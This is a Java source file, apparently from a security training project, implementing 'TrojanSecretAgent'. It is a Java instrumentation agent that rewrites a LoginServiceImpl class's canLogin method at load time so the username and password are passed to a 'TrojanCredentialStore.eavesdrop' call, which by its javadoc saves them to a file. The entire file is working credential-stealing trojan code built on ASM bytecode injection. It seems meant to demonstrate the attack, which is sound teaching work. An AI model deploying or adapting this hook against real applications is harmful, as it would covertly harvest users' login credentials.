/*
 * The MIT License (MIT)
 *
 * Copyright (c) 2015 QAware GmbH, Munich, Germany
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package de.qaware.campus.secpro.agent;

import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.tree.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.List;

/**
 * A custom Java agent implementation. Will instrument interesting methods, intercept
 * any call and safe credentials to file.
 *
 * @author mario-leander.reimer
 */
public class TrojanSecretAgent implements ClassFileTransformer {

    /**
     * Called when agent is started using -javaagent:jarpath
     *
     * @param agentArgs arguments
     * @param inst      instrumentation
     */
    public static void premain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new TrojanSecretAgent());
    }

    /**
     * Called when agent is started after VM startup
     *
     * @param agentArgs arguments
     * @param inst      instrumentation
     */
    public static void agentmain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new TrojanSecretAgent());
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        // no transformation being applied
        byte[] retVal = null;

        if ("de/qaware/campus/secpro/agent/impl/LoginServiceImpl".equals(className)) {
            ClassWriter classWriter = new ClassWriter(0);
            ClassVisitor classVisitor = new TrojanClassAdapter(classWriter);
            ClassReader classReader = new ClassReader(classfileBuffer);
            classReader.accept(classVisitor, 0);
            retVal = classWriter.toByteArray();
        }

        return retVal;
    }

    /**
     * Class adapter used to modify the canLogin method.
     */
    public static class TrojanClassAdapter extends ClassNode implements Opcodes {
        private final ClassVisitor cv;

        /**
         * Initialize the adapter with a class visitor
         *
         * @param cv the class visitor.
         */
        public TrojanClassAdapter(final ClassVisitor cv) {
            this.cv = cv;
        }

        @Override
        public void visitEnd() {
            for (MethodNode mn : (List<MethodNode>) methods) {
                if (mn.name.equals("canLogin")) {
                    InsnList il = new InsnList();

                    il.add(new VarInsnNode(ALOAD, 1));
                    il.add(new VarInsnNode(ALOAD, 2));
                    il.add(new MethodInsnNode(
                            INVOKESTATIC,
                            "de/qaware/campus/secpro/agent/TrojanCredentialStore",
                            "eavesdrop",
                            "(Ljava/lang/String;Ljava/lang/String;)V",
                            false));

                    mn.instructions.insert(il);
                    mn.maxStack += 2;
                }
            }

            accept(cv);
        }
    }
}
